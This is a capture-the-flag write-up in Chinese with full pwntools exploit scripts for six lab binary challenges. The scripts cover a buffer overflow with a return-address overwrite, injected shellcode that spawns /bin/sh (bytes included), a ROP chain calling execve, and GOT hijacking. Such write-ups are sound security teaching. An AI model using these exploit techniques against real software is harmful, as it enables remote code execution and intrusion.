# CTF

## helloworld

### Sol:
因為前面有一個紅色的$這是shell的符號，所以可以直接執行Linux指令找到flag

### Result:
![{7CBC37B5-679A-4DCF-929D-9D5DF006CB61}](https://hackmd.io/_uploads/BJf00DZx1x.png)
![{B447CE4A-94AA-42D0-A836-3331C03FAB08}](https://hackmd.io/_uploads/BJrkkubl1x.png)

## helloworld_again

### Description:
用IDA按F5，會進行反組譯，可以看到此題共有兩個保護機制：
1. 輸入字串不可大於48bytes(`strlen(s) > 0x30`)
2. 輸入字串必須是helloworld(`strcmp(s, "helloworld")`)

![image](https://hackmd.io/_uploads/rk_PoHwM1x.png)

![image](https://hackmd.io/_uploads/rJSKoSDz1e.png)
### Sol:
因此我們的payload需要具備以下條件
1. 包含'helloworld'字串
2. 字串大小不可大於48bytes
3. 必須在buffer塞入48bytes的資料(引發overflow)再加上8bytes把caller的ebp覆蓋掉，最後還有我們想要return的位址

透過objdump我們發現可以使用的address在0x40125b
![image](https://hackmd.io/_uploads/B1ufp67Wkg.png)
接續我們善用`\0`代表字串結尾的特性，設計了以下的payload：`b'helloworld\x00' + b'A'*0x25 + b'B'*8 + p64(helloworld)`
透過`\x00`結束字串輸入，讓程式讀取時能判讀到helloworld字串以及字串長度不超過48bytes，後續透過A把剩餘的buffer填滿，B把caller的ebp覆蓋再加上我們想要return的位址p64(helloworld)
### Code:
```
from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10001)

helloworld = 0x40125b

payload = b'helloworld\x00' + b'A' * 0x25 + b'B' * 8 + p64(helloworld) 


p.sendline(payload)


p.interactive()
p.close()
```
![image](https://hackmd.io/_uploads/SyupCLvM1e.png)

### Result:
![image](https://hackmd.io/_uploads/BJgYapze1g.png)

![image](https://hackmd.io/_uploads/Ski56pzg1x.png)


## shellcode

### Description:
![image](https://hackmd.io/_uploads/B17uwKIb1x.png)
### Sol:
從程式碼可以看到在func拿到buf的記憶體位址後會直接執行，因此不用特別找能夠return的address只需要將shellcode注入到此buffer即可。

### Code:
```
from pwn import *
context.arch = 'amd64'

p = remote('ctf.adl.tw', 10002)

shellcode = shellcraft.amd64.linux.sh()
p.send(asm(shellcode))

p.interactive()
p.close()
```
![image](https://hackmd.io/_uploads/rkGMkPDMkl.png)
* shellcraft.amd64.linux.sh(): pwnlib中提供可以執行bash的function
* asm(): pwnlib中提供可以組譯與反組譯的function。
::: spoiler 關於 shellcraft.amd64.linux.sh()與asm()
```
# shellcraft.amd64.linux.sh()
"    
/* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    
/* push b'/bin///sh\\x00' */\n    
push 0x68\n    
mov rax, 0x732f2f2f6e69622f\n    
push rax\n    
mov rdi, rsp\n    
/* push argument array ['sh\\x00'] */\n
/* push b'sh\\x00' */\n    
push 0x1010101 ^ 0x6873\n    
xor dword ptr [rsp], 0x1010101\n    
xor esi, esi /* 0 */\n    
push rsi /* null terminate */\n    
push 8\n    
pop rsi\n    
add rsi, rsp\n    
push rsi 
/* 'sh\\x00' */\n    
mov rsi, rsp\n    
xor edx, edx 
/* 0 */\n    
/* call execve() */\n    
push SYS_execve 
/* 0x3b */\n    
pop rax\n    
syscall\n
"
```
```
asm(shellcraft.amd64.linux.sh())
jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05
```
:::

### Result:
![image](https://hackmd.io/_uploads/Sy03iTX-kx.png)


## shellcodeplus

### Description:
相比上一個程式shellcodeplus多了兩個保護機制
1. buffer中不能有`0x90`這個字元(即NOP指令)
2. buffer當中0,6,12,18,24,30,36,42,48,54必須是`0x0c`，1,7,13,19,25,31,37,43,49,55必須是`0x87`
![image](https://hackmd.io/_uploads/BJX1utI-ye.png)

### Sol:
根據以上的限制我們設計的payload如下：`b'\x0c\x87' + b'\x41\x41\x41\x41'`*10先建立好前面會被檢查的buffer，後續再加上pwnlib內建的shellcode機器碼即可
### Code:
```
from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10003)

# 建立前 60 bytes的模式
pattern = b""
for _ in range(10):
    pattern += b"\x0c\x87" + b"\x41\x41\x41\x41"  # 使用 0x41 作為填充，避免 0x90

# 生成不含 0x90 的 Shellcode
shellcode = shellcraft.amd64.linux.sh()
compiled_shellcode = asm(shellcode)

final_payload = pattern + compiled_shellcode

p.sendline(final_payload)
p.interactive()

p.close()

```

### Result:

![image](https://hackmd.io/_uploads/S1s-wYI-1x.png)


## gadgethunter

### Sol

#### 程式碼分析
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  _QWORD v8[4]; // [rsp+0h] [rbp-20h] BYREF

  memset(v8, 0, sizeof(v8));
  setbuf(stdout, 0LL, envp);
  puts("Enter your secret message:");
  read(0LL, v8, 208LL);
  printf((unsigned int)"Here is what you entered:\n%s\n", (unsigned int)v8, v3, v4, v5, v6, v8[0]);
  return 0;
```
1. 變數初始化:
* `v8[4]` 是一個 QWORD 陣列（64-bit，每個元素 8 bytes，共 32 bytes）。
* 使用 `memset` 初始化 v8，將其所有內容設為 0。
2. 函數邏輯:
* `setbuf(stdout, 0LL, envp)`: 關閉標準輸出的緩衝區。
* `puts`: 提示使用者輸入訊息。
* `read`: 允許使用者輸入 208 bytes 的內容，直接寫入到 v8 陣列中。 
3. 漏洞點：
* 陣列 v8 僅有 32 bytes 空間，但 read 函數讀入了 208 bytes，這會造成緩衝區溢出，導致覆蓋後續的記憶體內容，包括返回地址。
4. 輸出內容：
* 使用 `printf` 輸出使用者的輸入內容 (v8)，沒有格式化字串漏洞，但會顯示可能的溢出後內容。

![image](https://hackmd.io/_uploads/S1f5wvPG1l.png)

接著分析要如何使用Gadget執行```execve("/bin/sh", NULL, NULL)```

ROPgadget 會幫我們選出所有以 pop 開頭 ret 結束的 Gadget 位址
接著再透過 grep 選擇我們需要的暫存器，結果如下：
![image](https://hackmd.io/_uploads/rym-pDPMyg.png)
可以注意到 pop rdx 後面還會接一個 pop rbx
我們不需要用到也不影響到其他 Gadget 所以沒關係，隨便填入一個值就好

使用以下命令找syscall的address
![image](https://hackmd.io/_uploads/r1p0TPPGkl.png)

這個執行檔中沒有記憶體位子是存在/bin/sh的 所以自己寫入一塊 然後再把這一塊拿來用
![image](https://hackmd.io/_uploads/S1DgRDwMyg.png)

所以用pwndbg裡的vmmap 查可以寫入的address(這裡選擇寫入0x4C9000)
![image](https://hackmd.io/_uploads/r1QJeuDz1g.png)

用ROPgadgets找到 mov qword ptr [rsi], rax; ret的address
![image](https://hackmd.io/_uploads/Sy7DKdwG1x.png)


利用 mov qword ptr [rsi], rax; ret 
把 rax 裡面的字串 "/bin/sh\x00" 寫入到 rsi 裡面的地址(0x4C9000)

所以writeaddress就是變成前面寫進去的/bin/sh的address

所以ROP裡放入binsh 這部分是為能夠先用mov把/bin/sh寫入然後之後拿來用

#### p64(pop_rsi):
這個 gadget (pop rsi; ret) 會將暫存器 rsi 設置為下一個 64 位值。
在此被設置為 writeaddress，即 /bin/sh 存放的地址。
#### p64(writeaddress): 
在哪裡將 /bin/sh 寫入。
#### p64(pop_rax):
這個 gadget (pop rax; ret) 會將 rax 暫存器設置為下一個 64 位值。接下來，rax 暫存器將被設置為 /bin/sh 字串。
#### p64(mov)
mov 是一個 ROP gadget，其作用是將 rax 寫入 rsi 所指定的地址。這裏將 /bin/sh 寫入到目標的堆區地址。

#### p64(pop_rax) + p64(0x3b)

system call number會放入rax

![image](https://hackmd.io/_uploads/Syk_QFvM1x.png)
![image](https://hackmd.io/_uploads/BkDyHaOG1x.png)


### Code:
```python
from pwn import *
context.arch = 'amd64'
p = remote('ctf.adl.tw', 10005)

// ROP gadgets
syscall = 0x0401c74  
pop_rdi = 0x0401ebf  # pop rdi
pop_rsi = 0x0409eee  # pop rsi
pop_rdx = 0x0485c0b  # pop rdx; pop rbx ; ret
pop_rax = 0x044fcc7  # pop rax

mov = 0x0452435   # mov qword ptr [rsi], rax; ret

// Write address where "/bin/sh" will be written
writeaddress = 0x4C9000

// Build ROP chain for writing "/bin/sh" to memory
binsh = p64(pop_rsi) + p64(writeaddress) + p64(pop_rax) + b'/bin/sh\x00' + p64(mov)

rop = p64(pop_rdi) + p64(writeaddress)  # Set rdi to the address of "/bin/sh"
rop += p64(pop_rsi) + p64(0x0)  # Set rsi to NULL
rop += p64(pop_rdx) + p64(0x0)*2   # Set rdx to NULL
rop += p64(pop_rax) + p64(0x3b)  # Set rax to 0x3b (syscall number for execve)
rop += p64(syscall)

payload = b'A' * (0x20) + b'B' * (0x8) + binsh + rop
p.sendline(payload)
p.interactive()
p.close()
```


### Result:

![image](https://hackmd.io/_uploads/B1l8KkIMyl.png)



## doors

### Sol:

用checksec查這題的保護機制

![image](https://hackmd.io/_uploads/B1ssL8DMJx.png)

發現沒有開啟PIE，執行的位址就不會變化

用file doors這個指令
![image](https://hackmd.io/_uploads/Skirmxtfyl.png)

可以看到上面寫說這程式是動態連結，意思就是說使用的外部函式會是程式開始執行時才載入進來，也就是說他需要去解析外部函式的位置

當第一次使用此函數時，他會去解析位址執行完那個函數後，順便把函數位址存起來，而存起來的地方就是這個GOT表

GOT 是一個 function pointer array 用來儲存外部 function 位置


用IDA開啟程式
main:
![image](https://hackmd.io/_uploads/SyUHwLwMkl.png)

後門程式:
![image](https://hackmd.io/_uploads/rkbOwIPGJl.png)

觀察一下使用者的兩個輸入，可以發現第一個輸入可以讓第二個輸入任意寫

第一次輸入3，再往下執行，就會發現把剛剛輸入的抓出來 3*8，然後把 doors 的位址(0x4040a0)加上24，並且把加完的這個結果作為 scanf 的第二個參數， 也就是要寫入的位址

所以說第二輸入的內容，假設輸入10，他會變成0xA存在doors+24這個位址


![image](https://hackmd.io/_uploads/rkOVwGtG1l.png)


![image](https://hackmd.io/_uploads/rJZHwGKMJe.png)


puts@GLIBC就是GOT位址

![image](https://hackmd.io/_uploads/SkRqQGYG1e.png)

當main呼叫 puts 的時候，他會跳到這個 puts@plt 的這個位置
plt的位址處於紅色這段，但我們發現0x404018是可以寫的

![image](https://hackmd.io/_uploads/rJ9Xi-YM1g.png)


所以我們發現可以透過改變puts 的GOT(Global Offset Table)來達成 GOT-Hijacking 然後跳到 treasure，以劫持程式執行流程並觸發任意程式碼執行，觸發RCE(Remote Code Execution)。

puts 函式在 GOT中的位址
```
puts = 0x404018
```

treasure是目標函式的地址，是我們希望控制流程跳轉到此位址以觸發RCE
```
doors = 0x4040a0
treasure = 0x40123b
```

所以算完offset等於doors要加多少會跑到got
```
offset = (puts - doors) // 8
```

發送第一個sendline，發送計算出的offset
發送第二個sendline，寫入 treasure 的位址，覆蓋GOT表中的 puts 函式位址

所以當程式執行到 puts 時，不再跳到原本的puts位址，而是跳到  treasure並執行程式碼，進入shell
```
p.sendline(str(offset).encode())
p.sendline(str(treasure).encode())
```

### Code:
```python
from pwn import *
context.arch = 'amd64'

p = remote('ctf.adl.tw', 10007)

puts = 0x404018
doors = 0x4040a0
treasure = 0x40123b

offset = (puts - doors) // 8

p.sendline(str(offset).encode())
p.sendline(str(treasure).encode())

p.interactive()
p.close()
           
```

### Result:
![image](https://hackmd.io/_uploads/BkOkYkUGJl.png)


doors 解法說明:
用checksec查這題的保護機制，發現沒有開啟PIE，執行的位址就不會變化
如果要說更細節的話 是每次可執行區段載入的位置一樣

用file doors這個指令
可以看到上面寫說這隻程式是動態連結 
意思就是說使用的外部函式會是程式開始執行時才載入進來
也就是說他需要去解析外部函式的位置
那為了效能上的考量
他不會一次解析全部有使用到的
而是要使用時才去解析
(這個稱為延遲綁定機制)

當第一次使用此函數時 他會去解析位址
執行完那個函數後，順便把函數位址存起來，存起來的地方就是這個 GOT 表

然後呼叫第二次時就不用這麼麻煩
直接存取那個表的內容就好

因此 GOT Hijacking 的一個硬性條件是 你個函數必須先被呼叫過
不然他會直截跳入解析函數位址的程式而不是GOT

用IDA開啟程式，發先有一個主程式和一個後門程式

觀察一下使用者的兩個輸入，可以發現第一個輸入可以讓第二個輸入任意寫

第一次輸入3，再往下執行，就會發現把剛剛輸入的抓出來 3*8，然後把 doors 的位址(0x4040a0)加上24，並且把加完的這個結果作為 scanf 的第二個參數， 也就是要寫入的位址

所以說第二輸入的內容，假設輸入10，他會變成0xA存在doors+24這個位址


因此我們可以發現，我們可以任意操控下一行輸入要寫在哪個位置

所以簡單來說是你可以選擇一個位址
然後在那個位址上填你要的值


當main呼叫 puts 的時候，他會跳到這個 puts@plt 的這個位置
你可以看到第二行(94)那邊 有一個 jmp，這個jump會跳到GOT表

也就是說 如果我們有機會篡改到跳轉的位置
那是不是就能直接竄改成他的後門函數位址


可能會想說那我是不是能直截改 puts@plt 的位址
結論是不行因為那邊不可寫


plt的位址處於紅色這段，但我們發現0x404018是可以寫的

所以我們如果有辦法把 404018 上面存的位址(puts的位址) 改成我想要的位址(backdoor位址) 
是不是就達成我們的目的了


所以我們發現可以透過改變puts 的GOT(Global Offset Table)來達成 GOT-Hijacking 然後跳到 treasure，以劫持程式執行流程並觸發任意程式碼執行，觸發RCE(Remote Code Execution)。

因為是竄改 GOT 的內容操控執行流程
因此稱為 GOT Hijacking
如果你要問怎麼判斷的話
大概就是
1. 是動態連結
2, 是第二次執行
3. 是有辦法知道 GOT 位址
4. 有辦法寫入


因此py檔裡就會寫出
puts 函式在 GOT中的位址
treasure是目標函式的地址，是我們希望控制流程跳轉到此位址

所以算完offset等於doors要加多少會跑到got(-17)


發送第一個sendline，發送計算出的offset，看是多少之後會x8加上doors的位置就會指向puts 的got位置
發送第二個sendline，寫入 treasure 的位址，覆蓋GOT表中的 puts 函式位址

所以當程式執行到 puts 時，不再跳到原本的puts位址，而是跳到  treasure並執行程式碼，進入shell
